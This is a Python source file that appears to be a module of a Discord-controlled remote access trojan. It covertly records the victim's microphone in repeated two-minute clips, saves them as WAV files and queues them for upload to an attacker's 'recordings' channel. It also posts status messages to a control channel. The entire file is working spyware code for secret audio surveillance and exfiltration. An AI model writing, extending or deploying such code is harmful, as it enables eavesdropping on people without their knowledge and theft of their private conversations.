from scipy.io.wavfile import write
from threading import Thread
from resources.misc import *
import sounddevice
import os
# end of imports
# anywhere
def start_recording():
    global files_to_send, channel_ids, send_recordings
    #.log Trying to start microphone recording 
    while True:
        if send_recordings:
            recorded_mic = sounddevice.rec(int(120 * 16000), samplerate=16000, channels=1)
            #.log Initialized sounddevice recording class 
            sounddevice.wait()
            #.log Recorded audio from microphone 
            try: os.mkdir('rec_')
            except: pass
            record_name = 'rec_\\' + current_time() + '.wav'
            write(record_name, 16000, recorded_mic)
            #.log Saved recorded microphone into file 
            files_to_send.append([channel_ids['recordings'], '', record_name, True])
            #.log Added new file to send (containing microphone recording) 
        else:
            time.sleep(20)
# !recording_startup
recordings_obj = client.get_channel(channel_ids['recordings'])
async for latest_message in recordings_obj.history(limit=2):
    latest_messages_in_recordings.append(latest_message.content)
if 'disable' not in latest_messages_in_recordings:
    #.log \'disable\' message is not sent on recordings channel. Trying to start recording 
    Thread(target=start_recording).start()
    #.log Started microphone recording thread 
    await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
    #.log Sent message about started recording 
    latest_messages_in_recordings = []
else:
    #.log \'disable\' message is sent on recordings channel. Aborting the record function 
    Thread(target=start_recording).start()
    await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete the "disable" message on` <#' + str(channel_ids['recordings']) + '>')
    #.log Sent message about disabled recording 
    latest_messages_in_recordings = []
